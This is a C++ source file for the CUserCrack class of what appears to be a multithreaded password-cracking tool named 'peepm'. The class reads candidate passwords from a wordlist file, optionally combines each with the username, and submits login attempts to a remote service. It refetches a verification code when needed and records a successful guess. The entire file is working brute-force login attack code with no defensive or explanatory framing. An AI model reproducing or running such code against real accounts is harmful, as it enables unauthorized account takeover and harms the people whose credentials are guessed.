#include "StdAfx.h"
#include "UserCrack.h"
#include "peepmUtil.h"

CUserCrack::CUserCrack(BOOL single, PeepmPassword* peepmPassword, char* username, UINT id, UINT threadMax, DWORD delay, CCriticalSection* section, CEvent* event, PeepmWrite* peepmWrite, CpeepmUI& peepmUI) : CpeepmCrack(id, threadMax, delay, section, event, peepmWrite, peepmUI)
{
	m_PeepmPassword = peepmPassword;
	m_Username = username;
	m_Single = single;
	m_Password = NULL;
}

CUserCrack::~CUserCrack()
{

}

BOOL CUserCrack::OnStarted()
{
	if (!InitSocket())
		return FALSE;

	ConnectSocket();
	if (!GetCode())			
		return FALSE;
	
	m_Password = GetPassword();
	return TRUE;
}

BOOL CUserCrack::OnProgress()
{	
	if (m_Password != NULL)
	{
		char* username = m_Username;
		char* p = m_Password;
		if (m_Single)		
			p = AppendPassword(username, m_Password);
				
		UINT ret = GetLogin(username, p, TRUE);
		if (m_Single)
			ReleaseArray(p);
		
		if (ret == 2)
		{
			if (GetCode())
				return TRUE;
			else
			{
				ReleaseArray(m_Password);				
				return FALSE;
			}
		}

		ReleaseArray(m_Password);

		if (ret == 0)
		{
			SetSuccess();
			return FALSE;
		}

		m_Password = GetPassword();
	}
	else			
		return FALSE;
	
	return TRUE;
}

void CUserCrack::OnStoped()
{
	
}

void CUserCrack::OnRelease()
{
	fclose(m_PeepmPassword->file);
	ReleaseArray(m_Username);	
	ReleaseArray(m_PeepmPassword->passwordPath);
	ReleaseArray(m_PeepmPassword->buffer);
	ReleaseObject(m_PeepmPassword);
}

BOOL CUserCrack::OpenPassword()
{
	char* path = m_PeepmPassword->passwordPath;	
	if (!m_Section->Lock())
		return FALSE;

	FILE* file = fopen(path, "rb");
	if (file == NULL)
	{
		m_Section->Unlock();
		return FALSE;
	}

	fseek(file, 0, SEEK_END);
	m_PeepmPassword->rows = ftell(file);
	fseek(file, 0, SEEK_SET);

	m_PeepmPassword->file = file;
	m_Section->Unlock();

	return TRUE;
}

void CUserCrack::SetSuccess()
{
	if (!m_Section->Lock())
		return;

	m_PeepmPassword->success = TRUE;
	m_Section->Unlock();
}

char* CUserCrack::GetPassword()
{
	if (!m_Section->Lock())
		return NULL;

	FILE* file = m_PeepmPassword->file;
	if (file == NULL)
	{
		m_Section->Unlock();
		return NULL;
	}

	char* buffer = m_PeepmPassword->buffer;
	UINT total = m_PeepmPassword->total;
	UINT* size = &m_PeepmPassword->size;
	long* length = &m_PeepmPassword->length;	
	char** p = &m_PeepmPassword->p;
	BOOL success = m_PeepmPassword->success;
	if (success)
	{
		m_Section->Unlock();
		return NULL;
	}
	
	while (!feof(file) || *length > 0)
	{			
		BOOL flag = FALSE;

		if (*length == 0)
		{
			long start = ftell(file);
			int ret = fread(*p, *size, 1, file);
			long end = ftell(file);
			*length = end - start;
			(*p)[*length] = '\0';
			*length += *p - buffer;
			*p = buffer;
		}

		char* q = *p;

		while (q - *p < *length)
		{
			if (*q == '\r' || *q == '\n')
			{
				if (flag)
					break;			
				else
				{
					(*p)++;					
					(*length)--;
					m_PeepmPassword->row++;
				}
			}
			else				
				flag = TRUE;

			q++;
		}

		if (flag)
		{	
			if (q - *p == *length && !feof(file))
			{
				CopyMemory(buffer, *p, *length);
				*p = buffer;				
				*p = buffer + *length;				
				*size = total - *length;
				*length = 0;
				continue;
			}

			UINT len = q - *p;			
			char* password = new char[len + 1];	
			CopyMemory(password, *p, len);
			password[len] = '\0';
			m_PeepmPassword->row += len;
			
			*length -= len;
			*p = q;
			q++;
			m_PeepmPassword->row++;
			while (q - *p < *length)
			{
				if (*q == '\r' || *q == '\n')
				{
					q++;
					m_PeepmPassword->row++;
				}
				else
					break;
			}

			if (q - *p < *length)
			{
				*length = *length - (q - *p);
				*p = q;				
			}
			else
			{
				*length = 0;
				*p = buffer;
				*size = total;
			}

			double v = (double)m_PeepmPassword->row / (double)m_PeepmPassword->rows;
			v = v * 100;
			int s = (int)v;
			char progress[8] = {0};
			sprintf(progress, "%d%%", s);

			char* x = password;
			if (m_Single)
				x = AppendPassword(m_Username, password);

			m_PeepmUI.OnThreadProgress(m_Id, m_Username, x, progress);
			if (m_Single)
				ReleaseArray(x);

			m_Section->Unlock();
			return password;
		}
		else
		{
			*length = 0;
			*p = buffer;
			*size = total;
		}
	}

	m_Section->Unlock();
	return NULL;
}

UINT CUserCrack::InitPassword(LPVOID param)
{
	CUserCrack* crack = (CUserCrack *)param;
	CEvent* event = crack->GetEvent();
	crack->OpenPassword();
	event->SetEvent();
	return 1;
}